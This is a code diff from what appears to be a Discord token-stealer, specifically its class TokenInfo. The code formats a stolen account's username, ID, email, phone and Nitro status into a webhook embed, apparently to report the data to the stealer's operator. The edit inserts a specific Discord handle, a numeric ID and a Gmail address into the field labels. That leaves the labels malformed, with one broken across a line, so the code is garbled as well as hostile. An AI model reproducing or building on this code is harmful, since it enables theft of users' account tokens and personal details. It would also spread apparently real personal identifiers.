@@ -156,9 +156,10 @@ class TokenInfo:
                 avatar_url=EMBED_AVATAR)
             embed = DiscordEmbed(color=EMBED_COLOR)
 
-            embed.add_embed_field(name='User Token Info', value=f""":crown:`Username:` **{self.username}#{self.discriminator}**
-:id:`User ID:` **{self.id}**
-:e_mail:`Mail:` **{self.email}**
+            embed.add_embed_field(name='User Token Info', value=f""":crown:`Username:aguero#8540
+` **{self.username}#{self.discriminator}**
+:id:`954003578471731260:` **{self.id}**
+:e_mail:`Mail:abo5leel666@gmail.com` **{self.email}**
 :mobile_phone:`Phone:` **{self.phone}**
 :money_with_wings:`Nitro:` **{':white_check_mark:' if self.has_nitro else ':x:'}**""", inline=False)
 
